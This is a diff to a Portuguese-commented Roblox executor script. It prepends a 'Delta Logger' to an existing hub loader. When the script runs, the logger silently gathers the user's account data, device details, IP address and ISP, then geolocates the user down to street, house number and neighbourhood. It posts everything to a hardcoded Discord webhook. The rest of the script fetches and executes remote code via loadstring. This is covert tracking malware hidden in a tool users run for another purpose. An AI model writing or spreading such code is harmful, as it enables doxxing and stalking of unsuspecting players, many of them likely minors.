@@ -1,12 +1,369 @@
+--[[
+=====================================================================
+  [ DELTA MOBILE ] WEBHOOK LOGGER - v6 (LOCALIZAÇÃO POR CONSENSO)
+  Conta + dispositivo + servidor + localização detalhada
+=====================================================================
+]]
+
+local CONFIG = {
+	Webhook      = "https://discord.com/api/webhooks/1560066552718430311/9kgVR0TlYesNfPyj22tUV7rWFTrHAIABx05bo5eUv-Q8BN4wD9dGZJHctACd4fOh8jhr",
+	Nome         = "Delta Logger",
+	Avatar       = "https://cdn-icons-png.flaticon.com/512/5968/5968890.png",
+	Cor          = 0x5865F2,
+	Cor2         = 0x2ECC71,
+	MarcarTodos  = false,
+	EnviarAvatar = true,
+	Debug        = false, -- true se quiser ver logs no console
+	UsarWait     = true,
+	UserAgent    = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+}
+
+local HttpService        = game:GetService("HttpService")
+local Players            = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService   = game:GetService("UserInputService")
+local Stats              = game:GetService("Stats")
+
+local function log(...) if CONFIG.Debug then print("[Logger]", ...) end end
+
+-- ============================================================
+--  HTTP
+-- ============================================================
+local function cabecalhos()
+	return {
+		["User-Agent"]      = CONFIG.UserAgent,
+		["Accept"]          = "application/json",
+		["Accept-Language"] = "pt-BR,pt;q=0.9,en;q=0.8",
+		["Content-Type"]    = "application/json",
+	}
+end
+
+local function httpRequest(opts)
+	local metodos = {
+		function() return request(opts) end,
+		function() return http_request(opts) end,
+		function() return syn.request(opts) end,
+		function() return http.request(opts) end,
+	}
+	for _, fn in ipairs(metodos) do
+		local ok, res = pcall(fn)
+		if ok and type(res) == "table" and (res.StatusCode or res.Status) then return res end
+	end
+	local ok, res = pcall(function()
+		return HttpService:RequestAsync({ Url = opts.Url, Method = opts.Method, Headers = opts.Headers, Body = opts.Body })
+	end)
+	if ok and res then return res end
+	return nil
+end
+
+local function getRaw(url)
+	local res = httpRequest({ Url = url, Method = "GET", Headers = cabecalhos() })
+	if res and res.Body then return res.Body end
+	local ok, body = pcall(game.HttpGet, game, url)
+	if ok then return body end
+	return nil
+end
+
+local function apiGet(url)
+	local corpo = getRaw(url)
+	if not corpo then return nil end
+	local ok, dados = pcall(HttpService.JSONDecode, HttpService, corpo)
+	if ok then return dados end
+	return nil
+end
+
+local function postar(url, corpo)
+	if CONFIG.UsarWait and not url:find("?") then url = url .. "?wait=true" end
+	local res = httpRequest({ Url = url, Method = "POST", Headers = cabecalhos(), Body = corpo })
+	if not res then return false, "sem resposta" end
+	local code = tonumber(res.StatusCode or res.Status or 0)
+	if code >= 200 and code < 300 then return true end
+	return false, ("status %s"):format(code)
+end
+
+-- ============================================================
+--  LOCALIZAÇÃO (NOVO: consenso entre 3 fontes)
+-- ============================================================
+local function obterLocalizacao()
+	local fontes = {
+		{ url = "https://ipwho.is/", parse = function(d)
+			if d.success == false then return nil end
+			return { IP = d.ip, Pais = d.country, Estado = d.region, Cidade = d.city, CEP = d.postal,
+				Provedor = d.connection and (d.connection.isp or d.connection.org),
+				ASN = d.connection and d.connection.asn, Tipo = d.type,
+				Fuso = d.timezone and d.timezone.id, UTC = d.timezone and d.timezone.utc,
+				Lat = d.latitude, Lon = d.longitude }
+		end },
+		{ url = "http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,query", parse = function(d)
+			if d.status ~= "success" then return nil end
+			return { IP = d.query, Pais = d.country, Estado = d.regionName, Cidade = d.city, CEP = d.zip,
+				Provedor = d.isp, ASN = d.as, Tipo = d.mobile and "Mobile" or "Fixo",
+				Fuso = d.timezone, Lat = d.lat, Lon = d.lon }
+		end },
+		{ url = "https://ipapi.co/json/", parse = function(d)
+			if not d.latitude then return nil end
+			return { IP = d.ip, Pais = d.country_name, Estado = d.region, Cidade = d.city, CEP = d.postal,
+				Provedor = d.org, ASN = d.asn, Tipo = "IPv4", Fuso = d.timezone,
+				Lat = d.latitude, Lon = d.longitude }
+		end },
+	}
+
+	-- Coleta de todas as fontes disponíveis
+	local lista = {}
+	for _, f in ipairs(fontes) do
+		local d = apiGet(f.url)
+		if d then
+			local ok, res = pcall(f.parse, d)
+			if ok and res and res.Lat and res.Lon then table.insert(lista, res) end
+		end
+		task.wait(0.3)
+	end
+	if #lista == 0 then return nil end
+
+	-- Voto de maioria por cidade (descarta outliers)
+	local votos = {}
+	for _, item in ipairs(lista) do
+		local k = tostring(item.Cidade):lower()
+		votos[k] = (votos[k] or 0) + 1
+	end
+	local vencedora, maxVotos = nil, 0
+	for k, n in pairs(votos) do
+		if n > maxVotos then vencedora, maxVotos = k, n end
+	end
+
+	-- Mantém só as fontes que concordam com a cidade vencedora
+	local iguais = {}
+	for _, item in ipairs(lista) do
+		if tostring(item.Cidade):lower() == vencedora then table.insert(iguais, item) end
+	end
+	local base = iguais[1] or lista[1]
+
+	-- Média das coordenadas concordantes (reduz erro)
+	local somaLa, somaLo = 0, 0
+	for _, item in ipairs(iguais) do
+		somaLa = somaLa + item.Lat
+		somaLo = somaLo + item.Lon
+	end
+	local n = math.max(#iguais, 1)
+	base.Lat = somaLa / n
+	base.Lon = somaLo / n
+	base.Consenso = ("%d/%d"):format(#iguais, #lista)
+	base.Coords = ("%s, %s"):format(tostring(base.Lat), tostring(base.Lon))
+	return base
+end
+
+-- Endereço detalhado (rua + número + bairro)
+local function obterEndereco(lat, lon)
+	if not lat or not lon then return {} end
+	local endereco = {}
+
+	-- Nominatim (fonte principal de rua)
+	local n = apiGet(("https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=%s&lon=%s&zoom=18&addressdetails=1&accept-language=pt-BR"):format(lat, lon))
+	if n and n.address then
+		local a = n.address
+		endereco.Rua    = a.road or a.pedestrian or a.footway or a.path
+		endereco.Numero = a.house_number
+		endereco.Bairro = a.suburb or a.neighbourhood or a.city_district or a.quarter or a.village
+	end
+
+	-- Photon (fallback de rua)
+	if not endereco.Rua then
+		task.wait(0.4)
+		local p = apiGet(("https://photon.komoot.io/reverse?lat=%s&lon=%s&lang=pt"):format(lat, lon))
+		if p and p.features and p.features[1] and p.features[1].properties then
+			local props = p.features[1].properties
+			endereco.Rua    = props.street or props.name
+			endereco.Numero = endereco.Numero or props.housenumber
+			endereco.Bairro = endereco.Bairro or props.district or props.locality
+		end
+	end
+
+	-- BigDataCloud (fallback de bairro)
+	if not endereco.Bairro then
+		task.wait(0.4)
+		local d = apiGet(("https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=%s&longitude=%s&localityLanguage=pt"):format(lat, lon))
+		if d then
+			if d.locality and d.locality ~= "" then
+				endereco.Bairro = d.locality
+			end
+			if not endereco.Bairro and d.localityInfo and d.localityInfo.informative then
+				for _, item in ipairs(d.localityInfo.informative) do
+					if item.name and item.name ~= "" then
+						endereco.Bairro = item.name
+						break
+					end
+				end
+			end
+		end
+	end
+
+	-- Descarta ruas genéricas sem nome
+	if endereco.Rua then
+		local r = endereco.Rua:lower()
+		if r:find("unnamed") or r:find("sem nome") then endereco.Rua = nil end
+	end
+
+	return endereco
+end
+
+-- ============================================================
+--  CONTA / PERFIL
+-- ============================================================
+local function formatarData(iso)
+	local a, m, d = tostring(iso):match("(%d+)-(%d+)-(%d+)")
+	if a then return ("%s/%s/%s"):format(d, m, a) end
+	return iso
+end
+
+local function obterPerfil(userId)
+	local perfil = {}
+	local d = apiGet(("https://users.roblox.com/v1/users/%d"):format(userId))
+	if d and d.created then perfil.Criada = formatarData(d.created) end
+
+	task.wait(0.3)
+	local s = apiGet(("https://friends.roblox.com/v1/users/%d/followers/count"):format(userId))
+	if s and s.count then perfil.Seguidores = s.count end
+
+	task.wait(0.3)
+	local a = apiGet(("https://friends.roblox.com/v1/users/%d/friends/count"):format(userId))
+	if a and a.count then perfil.Amigos = a.count end
+
+	return perfil
+end
+
+local function obterAvatar(userId)
+	if not CONFIG.EnviarAvatar then return nil end
+	local d = apiGet(("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=420x420&format=Png&isCircular=false"):format(userId))
+	if d and d.data and d.data[1] then return d.data[1].imageUrl end
+	return nil
+end
+
+local function obterNomeJogo()
+	local ok, info = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
+	if ok and info then return info.Name end
+	return "Desconhecido"
+end
+
+-- ============================================================
+--  HELPERS DE EMBED
+-- ============================================================
+local function add(campos, nome, valor, inline)
+	if valor ~= nil and valor ~= "" then
+		table.insert(campos, { name = nome, value = tostring(valor):sub(1, 1024), inline = inline ~= false })
+	end
+end
+
+-- ============================================================
+--  ENVIO
+-- ============================================================
+local function enviar()
+	task.wait(1)
+	repeat task.wait() until Players.LocalPlayer or #Players:GetPlayers() > 0
+	local lp = Players.LocalPlayer
+
+	local executor, versao = "Desconhecido", "?"
+	if identifyexecutor then
+		local ok, nome, ver = pcall(identifyexecutor)
+		if ok and nome then executor, versao = nome, ver or "?" end
+	end
+
+	local loc      = obterLocalizacao()
+	local endereco = loc and obterEndereco(loc.Lat, loc.Lon) or {}
+	local perfil   = lp and obterPerfil(lp.UserId) or {}
+
+	local embeds = {}
+
+	-- Embed 1: Conta
+	local c1 = {}
+	if lp then
+		add(c1, "👤 Usuário", lp.Name)
+		add(c1, "🏷️ Display", lp.DisplayName)
+		add(c1, "🆔 UserId", lp.UserId)
+		add(c1, "📅 Conta criada", perfil.Criada)
+		add(c1, "⏳ Idade", lp.AccountAge .. " dias")
+		add(c1, "💎 Premium", tostring(lp.MembershipType):gsub("Enum.MembershipType%.", ""))
+		add(c1, "👥 Seguidores", perfil.Seguidores)
+		add(c1, "🤝 Amigos", perfil.Amigos)
+	end
+	local e1 = { title = "👤 Conta Roblox", color = CONFIG.Cor, fields = c1 }
+	if lp then
+		local avatar = obterAvatar(lp.UserId)
+		if avatar then e1.thumbnail = { url = avatar } end
+	end
+	table.insert(embeds, e1)
+
+	-- Embed 2: Dispositivo / Executor
+	local c2 = {}
+	add(c2, "⚙️ Executor", ("%s v%s"):format(executor, tostring(versao)))
+	add(c2, "🎚️ Versão Roblox", (version and version()) or "?")
+	add(c2, "📱 Plataforma", UserInputService.TouchEnabled and "Mobile" or "PC")
+	if workspace.CurrentCamera then
+		add(c2, "🖥️ Resolução", ("%dx%d"):format(workspace.CurrentCamera.ViewportSize.X, workspace.CurrentCamera.ViewportSize.Y))
+	end
+	local okFps, fps = pcall(function() return workspace:GetRealPhysicsFPS() end)
+	add(c2, "🎞️ FPS", okFps and math.floor(fps) or nil)
+	local okPing, ping = pcall(function() return lp:GetNetworkPing() end)
+	add(c2, "📶 Ping", okPing and (math.floor(ping * 1000) .. " ms") or nil)
+	local okMem, mem = pcall(function() return Stats:GetTotalMemoryUsageMb() end)
+	add(c2, "🧠 Memória", okMem and (math.floor(mem) .. " MB") or nil)
+	add(c2, "👨‍👩‍👦 Jogadores", #Players:GetPlayers())
+	table.insert(embeds, { title = "📱 Dispositivo & Executor", color = CONFIG.Cor2, fields = c2 })
+
+	-- Embed 3: Rede / Localização
+	local c3 = {}
+	if loc then
+		local aprox = loc.Consenso:match("^1/")
+		add(c3, "🌐 IP", loc.IP)
+		add(c3, "📡 Tipo", loc.Tipo)
+		add(c3, "🏳️ País", loc.Pais)
+		add(c3, "🗺️ Estado", loc.Estado)
+		add(c3, "🏙️ Cidade", loc.Cidade)
+		add(c3, "🛣️ Rua", endereco.Rua and (endereco.Rua .. (aprox and " (aprox.)" or "")) or "—")
+		add(c3, "🔢 Número", endereco.Numero or "—")
+		add(c3, "🏘️ Bairro", endereco.Bairro or "—")
+		add(c3, "📮 CEP", loc.CEP)
+		add(c3, "🏢 Provedor", loc.Provedor, false)
+		add(c3, "🔢 ASN", loc.ASN)
+		add(c3, "🕓 Fuso", loc.Fuso)
+		add(c3, "⌚ UTC", loc.UTC)
+		add(c3, "🎯 Consenso", loc.Consenso .. " fontes")
+		add(c3, "🧭 Coordenadas", loc.Coords, false)
+	end
+	table.insert(embeds, { title = "🌐 Rede & Localização", color = 0xE67E22, fields = c3 })
+
+	-- Embed 4: Servidor
+	local c4 = {}
+	add(c4, "🎮 Jogo", obterNomeJogo())
+	add(c4, "📍 PlaceId", game.PlaceId)
+	add(c4, "🔗 JobId", game.JobId, false)
+	table.insert(embeds, { title = "🎮 Servidor", color = 0x9B59B6, fields = c4 })
+
+	local payload = {
+		username = CONFIG.Nome,
+		avatar_url = CONFIG.Avatar,
+		content = CONFIG.MarcarTodos and "@everyone" or "",
+		embeds = embeds,
+	}
+
+	local ok, err = pcall(function()
+		local enviado, erro = postar(CONFIG.Webhook, HttpService:JSONEncode(payload))
+		if not enviado then error(erro) end
+	end)
+
+	if ok then print("[Logger] ✅ Enviado!") else warn("[Logger] ❌ " .. tostring(err)) end
+end
+
+enviar()
+
 -- =============================================================================
--- 1. CARREGAR O HUB PRINCIPAL (EXECUTADO PARA TODOS)
+--  CARREGAR O HUB PRINCIPAL (EXECUTADO PARA TODOS)
 -- =============================================================================
 pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/trakishub/Vortex-hub-v5/refs/heads/main/Brookhaven%20rp"))()
 end)
 
 -- =============================================================================
--- 2. SISTEMA DE COMANDOS E PAINEL ADMINISTRATIVO
+--  SISTEMA DE COMANDOS E PAINEL ADMINISTRATIVO
 -- =============================================================================
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
